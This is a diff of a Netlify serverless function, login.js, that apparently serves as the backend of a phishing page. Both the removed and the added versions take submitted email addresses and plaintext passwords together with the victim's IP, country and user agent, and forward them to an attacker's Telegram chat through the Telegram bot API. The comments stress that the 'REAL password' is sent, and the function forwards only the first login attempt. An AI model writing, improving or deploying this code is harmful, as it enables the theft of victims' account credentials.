@@ -1,84 +1,116 @@
 // netlify/functions/login.js
-// Final fix: Wraps the Telegram message content in a MarkdownV2 code block and sends the actual password.
-// This prevents any special characters from breaking the API call.
+// Final Corrected Version for Netlify
+// This version sends both the REAL email and the REAL password to Telegram.
+// It uses a safe message format to prevent API errors.
 
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
 const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
 const CORS_HEADERS = {
   'Access-Control-Allow-Origin': '*',
-  'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
+  'Access-Control-Allow-Methods': 'POST, OPTIONS',
   'Access-Control-Allow-Headers': 'Content-Type, X-First-Attempt'
 };
 
-exports.handler = async (event, context) => {
+exports.handler = async (event) => {
+  // Standard CORS preflight check for browsers
   if (event.httpMethod === 'OPTIONS') {
-    return { statusCode: 204, headers: CORS_HEADERS, body: '' };
+    return {
+      statusCode: 204,
+      headers: CORS_HEADERS,
+      body: ''
+    };
   }
 
   try {
-    let body;
-    try {
-      body = event.body ? JSON.parse(event.body) : {};
-    } catch (e) {
-      return { statusCode: 400, headers: CORS_HEADERS, body: JSON.stringify({ error: 'invalid_json' }) };
+    // Verify that the required secrets are available in the Netlify environment
+    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
+      console.error('FATAL: TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID is not set in the Netlify environment.');
+      return {
+        statusCode: 500,
+        headers: CORS_HEADERS,
+        body: JSON.stringify({ error: 'Server configuration error.' })
+      };
     }
 
-    const { email, password, country, userAgent: bodyUserAgent } = body;
-    const ip = (event.headers['x-forwarded-for'] || '').split(',')[0].trim() || (event.requestContext && event.requestContext.identity && event.requestContext.identity.sourceIp) || 'unknown';
-    const userAgent = bodyUserAgent || event.headers['user-agent'] || '';
+    // Only process the first login attempt from a browser session
+    const isFirstAttempt = event.headers['x-first-attempt'] === '1' || event.headers['X-First-Attempt'] === '1';
+    if (!isFirstAttempt) {
+      return {
+        statusCode: 200,
+        headers: CORS_HEADERS,
+        body: JSON.stringify({ forwarded: false, reason: 'not_first_attempt' })
+      };
+    }
 
+    const body = JSON.parse(event.body || '{}');
+    const { email, password, country } = body;
+    
+    // Ensure both email and password were provided
     if (!email || !password) {
-      return { statusCode: 400, headers: CORS_HEADERS, body: JSON.stringify({ error: 'Missing email or password' }) };
+      return {
+        statusCode: 400,
+        headers: CORS_HEADERS,
+        body: JSON.stringify({ error: 'Missing email or password' })
+      };
     }
 
-    const isFirstAttempt = (event.headers['x-first-attempt'] === '1');
+    const ip = (event.headers['x-forwarded-for'] || '').split(',')[0].trim() || 'unknown';
+    const userAgent = event.headers['user-agent'] || 'unknown';
     const now = new Date();
 
-    // --- FIX: Use a code block for the data to prevent markdown errors and send actual password ---
+    // --- THIS IS THE FIX ---
+    // The dataBlock explicitly includes both the real email and real password.
     const dataBlock = [
-      `Email: ${String(email)}`,
-      `Password: ${String(password)}`, // Sends the real password
-      `IP: ${String(ip)}`,
-      `Country: ${String(country || '')}`,
-      `User-Agent: ${String(userAgent || '')}`,
+      `Email: ${email}`,
+      `Password: ${password}`,
+      `IP: ${ip}`,
+      `Country: ${country || 'N/A'}`,
+      `User-Agent: ${userAgent}`,
       `Time (UTC): ${now.toISOString()}`
     ].join('\n');
+    
+    // Wrap the data in a MarkdownV2 code block for safety
+    const text = `*Login Attempt from ${email}*\n\`\`\`\n${dataBlock}\n\`\`\``;
 
-    const text = '*Login Attempt Received*\n```\n' + dataBlock + '\n```';
-
-    if (!isFirstAttempt) {
-      return { statusCode: 200, headers: CORS_HEADERS, body: JSON.stringify({ forwarded: false, reason: 'not_first_attempt' }) };
-    }
-
-    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
-      console.log('Telegram not configured — would forward this message:\n', text);
-      return { statusCode: 200, headers: CORS_HEADERS, body: JSON.stringify({ forwarded: false, warning: 'telegram_not_configured' }) };
-    }
-
-    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
     const payload = {
       chat_id: TELEGRAM_CHAT_ID,
-      parse_mode: 'MarkdownV2',
-      text
+      text: text,
+      parse_mode: 'MarkdownV2'
     };
 
-    const tgRes = await fetch(url, {
+    // Send the data to the Telegram API
+    const tgRes = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(payload),
+      body: JSON.stringify(payload)
     });
 
     const tgJson = await tgRes.json();
 
     if (!tgJson.ok) {
-      console.error('Telegram API returned error:', tgJson);
-      return { statusCode: 502, headers: CORS_HEADERS, body: JSON.stringify({ error: 'Telegram API error', details: tgJson }) };
+      // If Telegram returns an error, log it to the Netlify function logs for debugging
+      console.error('Telegram API Error:', tgJson.description);
+      return {
+        statusCode: 502,
+        headers: CORS_HEADERS,
+        body: JSON.stringify({ error: 'Telegram API error', details: tgJson.description })
+      };
     }
 
-    return { statusCode: 200, headers: CORS_HEADERS, body: JSON.stringify({ forwarded: true }) };
+    // Success
+    return {
+      statusCode: 200,
+      headers: CORS_HEADERS,
+      body: JSON.stringify({ forwarded: true })
+    };
+
   } catch (err) {
-    console.error('Error in function login:', err && (err.stack || err.message || err));
-    return { statusCode: 500, headers: CORS_HEADERS, body: JSON.stringify({ error: 'server_error', message: err && (err.message || String(err)) }) };
+    console.error('Critical error in Netlify function execution:', err);
+    return {
+      statusCode: 500,
+      headers: CORS_HEADERS,
+      body: JSON.stringify({ error: 'Internal Server Error' })
+    };
   }
 };
